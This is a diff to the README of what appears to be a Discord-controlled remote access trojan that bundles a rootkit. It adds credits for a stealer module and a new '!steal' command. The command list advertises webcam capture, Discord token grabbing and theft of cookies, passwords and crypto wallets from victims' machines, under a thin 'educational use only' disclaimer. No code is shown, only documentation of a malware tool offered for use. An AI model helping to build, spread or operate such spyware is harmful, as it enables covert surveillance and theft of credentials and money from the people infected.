@@ -10,6 +10,8 @@ The output file size also around ~75kb!
 This tool is for educational use only, the author will not be held responsible for any misuse of this tool.
 
 ## **Credits**
+The Discord Rat was made by moom825. Huge thanks. I just added the stealer and runner.
+The stealer was made by can-kat. Huge thanks too, I just added the command.
 The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
 
 ## **Setup Guide:**
@@ -72,7 +74,9 @@ Available commands are :
 --> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
 --> !webcampic = Take a picture out of the selected webcam
 --> !grabtokens = Grab all discord tokens on the current pc
+--> !steal = Steals all the information from the device (cookies, passwords, crypto,...)
 --> !help = This help menu
+ 
 ```
 
 ## Donation
